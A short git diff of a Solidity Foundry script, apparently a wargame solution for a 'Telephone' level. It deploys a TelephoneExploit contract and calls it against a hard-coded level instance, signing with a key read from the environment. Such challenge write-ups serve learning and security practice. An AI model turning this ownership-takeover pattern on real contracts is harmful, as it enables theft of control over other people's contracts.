@@ -7,15 +7,18 @@ import {TelephoneExploit} from "src/04/TelephoneExploit.sol";
 
 contract Exploit is Script {
 
-        address userOwner = vm.envAddress("PRIVATE_KEY");
-        TelephoneExploit exploit = TelephoneExploit(userOwner);
-        address levelInstance = 0x7249C705bDf64c3b72CcB9fdd0f410Fd52666422;
-        Telephone level = Telephone(levelInstance);
+        address levelInstance = 0x63f80459C2CBa9692DFA70eD43c66423a9596c02;
+        address hacker = vm.envAddress("PUBLIC_KEY");
 
+        Telephone level = Telephone(levelInstance);        
+        
         function run() external {
 
             vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-            exploit.changeOwner();
+            
+            TelephoneExploit exploit = new TelephoneExploit();
+            exploit.run(level);
+
             vm.stopBroadcast();
     }
 }
